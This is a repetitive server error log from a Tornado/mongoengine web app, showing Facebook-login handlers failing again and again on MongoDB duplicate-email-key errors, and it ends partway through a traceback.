ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
